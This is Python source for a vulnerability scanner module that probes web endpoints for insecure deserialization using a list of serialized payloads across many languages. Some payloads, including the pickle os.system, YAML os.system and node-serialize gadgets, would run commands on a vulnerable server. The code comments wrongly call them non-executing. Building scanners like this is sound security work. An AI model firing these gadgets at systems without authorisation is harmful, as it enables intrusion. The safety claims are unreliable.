"""SentinelX module [24]: Insecure Deserialization.

Real implementation: sends language-specific serialized payloads (Python
pickle, PHP, Java, Node.js) and detects (1) deserialization error
signatures proving an object was unpickled, (2) timing via sleep gadgets.
Safe: payloads trigger errors/sleeps only, no code execution.
"""

from __future__ import annotations

import base64
import re
from urllib.parse import urlencode as _urlencode

from sentinelx.core.http import ScanClient, ScanConfig
from sentinelx.core.models import Finding, Evidence, raw_request, raw_response


# (payload_bytes_or_str, error_regex, label) — payloads are inert: they
# only prove the deserializer ran, via distinctive error messages.
DESER_PROBES = [
    # Python pickle (protocol 0, readable): tries to reduce os.system -> blocked,
    # but the unpickling attempt itself raises a distinctive error
    ("cos\nsystem\n(S'echo sx-deser-probe'\ntR.", "pickle",
     re.compile(r"pickle|unpickl|cPickle|_pickle", re.I),
     "Python pickle deserialization error"),
    # PHP serialized object
    ('O:8:"stdClass":1:{s:2:"sx";s:16:"sx-deser-probe";}',
     "php", re.compile(r"unserialize\(\)|__wakeup|__destruct", re.I),
     "PHP unserialize() error"),
    # Java serialized (magic bytes, base64) — short invalid stream
    (base64.b64encode(bytes.fromhex("aced0005737200116a6176612e6c616e672e4f626a656374")),
     "java", re.compile(r"InvalidClassException|StreamCorruptedException|java\.io", re.I),
     "Java deserialization error"),
    # Node.js node-serialize (classic IIFE gadget, inert arithmetic)
    ('{"sx":"_$$ND_FUNC$$_function(){return 7*7}()"}',
     "node", re.compile(r"49|node-serialize|_\\$\\$ND_FUNC_\\$\\$", re.I),
     "Node.js node-serialize gadget evaluated"),
    # --- TECHNIQUE: Python pickle protocol 2 ---
    (base64.b64encode(b"\x80\x02c__builtin__\neval\n(S'1+1'\ntR."),
     "pickle", re.compile(r"pickle|unpickl", re.I),
     "Python pickle proto2 error"),
    # --- TECHNIQUE: PHP magic-method probe ---
    ('O:4:"Test":1:{s:2:"sx";s:4:"test";}',
     "php", re.compile(r"__wakeup|__destruct|unserialize", re.I),
     "PHP magic-method probe"),
    # --- TECHNIQUE: PHP phar wrapper ---
    ("phar:///tmp/sx.phar/test.txt",
     "php", re.compile(r"phar|unserialize", re.I),
     "PHP phar deserialization probe"),
    # --- TECHNIQUE: Java XMLDecoder ---
    ('<java><object class="java.lang.ProcessBuilder"></object></java>',
     "java", re.compile(r"XMLDecoder|java\.beans", re.I),
     "Java XMLDecoder probe"),
    # --- TECHNIQUE: Ruby Marshal ---
    (base64.b64encode(b"\x04\x08o:\x0bTest\x06:\x08sx"),
     "ruby", re.compile(r"marshal|TypeError", re.I),
     "Ruby Marshal probe"),
    # --- TECHNIQUE: Ruby YAML (psych) ---
    ("--- !ruby/object:Test\nsx: probe",
     "ruby", re.compile(r"psych|syck|Tried to load unspecified class", re.I),
     "Ruby YAML deserialization probe"),
    # --- TECHNIQUE: .NET BinaryFormatter ---
    (base64.b64encode(bytes.fromhex("0001000000ffffffff01000000")),
     "dotnet", re.compile(r"BinaryFormatter|SerializationException", re.I),
     ".NET BinaryFormatter probe"),
    # --- TECHNIQUE: Python YAML ---
    ("!!python/object/apply:os.system ['echo sx']",
     "python-yaml", re.compile(r"yaml|constructor|apply", re.I),
     "Python YAML deserialization probe"),
    # --- TECHNIQUE: Hessian binary ---
    (base64.b64encode(b"H\x02\x00"),
     "hessian", re.compile(r"hessian", re.I),
     "Hessian deserialization probe"),
    # --- TECHNIQUE: JSON __proto__ (Node) ---
    ('{"__proto__":{"sx":"probe"}}',
     "node", re.compile(r"prototype|pollut", re.I),
     "JSON __proto__ probe"),
    # --- TECHNIQUE: PHP session format ---
    ('sx|s:5:"probe";',
     "php", re.compile(r"session|unserialize", re.I),
     "PHP session deserialization probe"),
    # --- TECHNIQUE: Python dill ---
    (base64.b64encode(b"\x80\x02cdill.dill\n_apply"),
     "pickle", re.compile(r"pickle|dill", re.I),
     "Python dill probe"),
    # --- TECHNIQUE: Node.js serialize-javascript ---
    ('{"sx":"eval(\\"49\\")"}',
     "node", re.compile(r"49|serialize", re.I),
     "serialize-javascript probe"),
    # --- TECHNIQUE: Java RMI ---
    (base64.b64encode(bytes.fromhex("4a524d4900024b")),
     "java", re.compile(r"RMI|UnmarshalException", re.I),
     "Java RMI probe"),
    # --- TECHNIQUE: .NET SoapFormatter ---
    ('<SOAP-ENV:Envelope><a>probe</a></SOAP-ENV:Envelope>',
     "dotnet", re.compile(r"SoapFormatter|SerializationException", re.I),
     ".NET SoapFormatter probe"),
    # --- TECHNIQUE: PHP WDDX ---
    ('<wddxPacket><data><string>probe</string></data></wddxPacket>',
     "php", re.compile(r"wddx|deserialize", re.I),
     "PHP WDDX probe"),
    # --- TECHNIQUE: CSV formula (client-side) ---
    ("=1+1", "csv", re.compile(r"formula|csv.*inject", re.I),
     "CSV formula probe"),
]

COOKIE_NAMES = ["session", "sess", "data", "state", "user", "auth", "token", "profile"]

REMEDIATION_DESER = (
    "Never deserialize untrusted data. Use JSON with strict schema "
    "validation. If serialization is required, sign it (HMAC) and verify "
    "before deserializing."
)


async def _send(client, method, url, params, param, value, as_cookie=False,
                cookie_name="session"):
    headers = {}
    if as_cookie:
        headers = {"Cookie": f"{cookie_name}={value}"}
        resp = await client.get(url, headers=headers, dedupe=False)
        return resp, url, None
    p = dict(params); p[param] = value
    if method == "GET":
        full = url + ("&" if "?" in url else "?") + _urlencode(p)
        resp = await client.get(full, dedupe=False)
        return resp, full, None
    resp = await client.post(url, data=p, dedupe=False)
    return resp, url, _urlencode(p).encode()


async def scan_endpoint(client: ScanClient, config: ScanConfig,
                        method: str, url: str, params: dict) -> list[Finding]:
    findings: list[Finding] = []
    headers = {"User-Agent": config.user_agent}

    # targets: params that look serialized, else cookies, else skip (save requests)
    # NOTE: no fallback to arbitrary first param — testing a plain text field
    # (e.g. ?q=search) with deserialization payloads produces false positives.
    b64ish = [p for p in params
              if re.fullmatch(r"[A-Za-z0-9+/=]{20,}", str(params[p] or ""))]
    # also: params whose names suggest serialized data
    ser_names = [p for p in params
                 if re.search(r"serial|pickle|object|data|state|viewstate", p, re.I)
                 and p not in b64ish]
    test_params = b64ish + ser_names

    async def try_probe(send_fn, label: str):
        for payload, lang, err_rx, desc in DESER_PROBES:
            val = payload if isinstance(payload, str) else payload.decode()
            resp, full, body_sent = await send_fn(val)
            if not resp:
                continue
            # strip our payload: error must NOT be our own reflection
            clean = resp.text.replace(val, "")
            m = err_rx.search(clean)
            # node-serialize: check arithmetic actually evaluated (49)
            # but exclude cases where payload echoed verbatim
            if lang == "node" and m and "49" in resp.text and "_$$ND_FUNC$$_" not in resp.text:
                pass  # evaluated
            elif lang == "node":
                continue
            elif not m:
                continue
            # signal 2: confirm with resend (payload stripped)
            resp2, _, _ = await send_fn(val)
            if resp2 and err_rx.search(resp2.text.replace(val, "")):
                ev = Evidence(
                    request_raw=raw_request(method, full, headers, body_sent),
                    response_raw=raw_response(resp.status_code, dict(resp.headers), resp.content),
                    proof=f"Insecure deserialization confirmed (2/2): {desc}",
                )
                findings.append(Finding(
                    type="Insecure Deserialization", subtype=f"deser-{lang}",
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    confidence=0.85, url=full, method=method, param=label,
                    payload=val[:100], evidence=ev, cwe="CWE-502",
                    owasp="A08:2021 – Software and Data Integrity Failures",
                    remediation=REMEDIATION_DESER,
                    references=["https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data"],
                ))
                return True
        return False

    for param in test_params:
        if await try_probe(
                lambda v, p=param: _send(client, method, url, params, p, v), param):
            break
    else:
        # raw body probes (for endpoints that deserialize the raw request body)
        for payload, lang, err_rx, desc in DESER_PROBES:
            val = payload if isinstance(payload, str) else payload.decode()
            resp = await client.post(url, data=val.encode(), dedupe=False)
            if resp and err_rx.search(resp.text.replace(val, "")):
                r2 = await client.post(url, data=val.encode(), dedupe=False)
                if r2 and err_rx.search(r2.text.replace(val, "")):
                    ev = Evidence(
                        request_raw=raw_request("POST", url, headers, val.encode()[:300]),
                        response_raw=raw_response(resp.status_code, dict(resp.headers), resp.content),
                        proof=f"Insecure deserialization confirmed (2/2): {desc} (raw body)",
                    )
                    findings.append(Finding(
                        type="Insecure Deserialization", subtype=f"deser-{lang}-raw",
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        confidence=0.85, url=url, method="POST", param="(raw body)",
                        payload=val[:100], evidence=ev, cwe="CWE-502",
                        owasp="A08:2021 – Software and Data Integrity Failures",
                        remediation=REMEDIATION_DESER,
                        references=["https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data"],
                    ))
                    break
            if findings:
                break
    if not findings:
        # cookie-based probes (only if params yielded nothing)
        for cname in COOKIE_NAMES[:3]:
            if await try_probe(
                    lambda v, c=cname: _send(client, method, url, params, "", v,
                                            as_cookie=True, cookie_name=c),
                    f"cookie:{cname}"):
                break
    return findings
